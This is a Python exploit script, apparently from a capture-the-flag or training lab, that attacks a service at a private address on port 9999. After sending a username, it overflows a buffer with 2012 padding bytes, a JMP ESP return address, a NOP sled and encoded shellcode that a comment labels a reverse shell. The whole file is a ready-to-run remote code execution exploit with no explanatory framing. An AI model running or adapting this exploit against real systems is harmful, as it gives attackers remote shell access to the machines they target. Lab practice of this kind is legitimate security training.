import socket,sys,struct

ip = "10.10.178.146"
port = 9999

uname = b"sam"

buffer_len = 3000
offset = 2012
jmp_esp = 0x625014df


# shellcode for reverse shell
shellcode = b""
shellcode += b"\xbd\x5d\x2f\x7a\x38\xdb\xd4\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc"
shellcode += b"\x03\x35\x21\x98\xcd\x39\xd5\xde\x2e\xc1\x26"
shellcode += b"\xbf\xa7\x24\x17\xff\xdc\x2d\x08\xcf\x97\x63"
shellcode += b"\xa5\xa4\xfa\x97\x3e\xc8\xd2\x98\xf7\x67\x05"
shellcode += b"\x97\x08\xdb\x75\xb6\x8a\x26\xaa\x18\xb2\xe8"
shellcode += b"\xbf\x59\xf3\x15\x4d\x0b\xac\x52\xe0\xbb\xd9"
shellcode += b"\x2f\x39\x30\x91\xbe\x39\xa5\x62\xc0\x68\x78"
shellcode += b"\xf8\x9b\xaa\x7b\x2d\x90\xe2\x63\x32\x9d\xbd"
shellcode += b"\x18\x80\x69\x3c\xc8\xd8\x92\x93\x35\xd5\x60"
shellcode += b"\xed\x72\xd2\x9a\x98\x8a\x20\x26\x9b\x49\x5a"
shellcode += b"\xfc\x2e\x49\xfc\x77\x88\xb5\xfc\x54\x4f\x3e"
shellcode += b"\xf2\x11\x1b\x18\x17\xa7\xc8\x13\x23\x2c\xef"
shellcode += b"\xf3\xa5\x76\xd4\xd7\xee\x2d\x75\x4e\x4b\x83"
shellcode += b"\x8a\x90\x34\x7c\x2f\xdb\xd9\x69\x42\x86\xb5"
shellcode += b"\x5e\x6f\x38\x46\xc9\xf8\x4b\x74\x56\x53\xc3"
shellcode += b"\x34\x1f\x7d\x14\x3a\x0a\x39\x8a\xc5\xb5\x3a"
shellcode += b"\x83\x01\xe1\x6a\xbb\xa0\x8a\xe0\x3b\x4c\x5f"
shellcode += b"\xa6\x6b\xe2\x30\x07\xdb\x42\xe1\xef\x31\x4d"
shellcode += b"\xde\x10\x3a\x87\x77\xba\xc1\x40\x72\x33\xf5"
shellcode += b"\x1d\xea\x41\x05\x0f\xb7\xcc\xe3\x45\x57\x99"
shellcode += b"\xbc\xf1\xce\x80\x36\x63\x0e\x1f\x33\xa3\x84"
shellcode += b"\xac\xc4\x6a\x6d\xd8\xd6\x1b\x9d\x97\x84\x8a"
shellcode += b"\xa2\x0d\xa0\x51\x30\xca\x30\x1f\x29\x45\x67"
shellcode += b"\x48\x9f\x9c\xed\x64\x86\x36\x13\x75\x5e\x70"
shellcode += b"\x97\xa2\xa3\x7f\x16\x26\x9f\x5b\x08\xfe\x20"
shellcode += b"\xe0\x7c\xae\x76\xbe\x2a\x08\x21\x70\x84\xc2"
shellcode += b"\x9e\xda\x40\x92\xec\xdc\x16\x9b\x38\xab\xf6"
shellcode += b"\x2a\x95\xea\x09\x82\x71\xfb\x72\xfe\xe1\x04"
shellcode += b"\xa9\xba\x02\xe7\x7b\xb7\xaa\xbe\xee\x7a\xb7"
shellcode += b"\x40\xc5\xb9\xce\xc2\xef\x41\x35\xda\x9a\x44"
shellcode += b"\x71\x5c\x77\x35\xea\x09\x77\xea\x0b\x18"

# creating the buffer
buffer = b""
buffer += b"A" * offset
buffer += struct.pack("<I", jmp_esp)
buffer += b"\x90" * 20
buffer += shellcode
buffer += b"C" * (buffer_len * len(buffer))

try:
    print("[+] Sending bufffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    s.send((uname + b"\r\n"))
    s.recv(1024)
    s.send((buffer + b"\r\n"))
    s.recv(1024)
except:
    print('[!] Unable to connect to the application.')
    sys.exit(0)
finally:
    s.close()

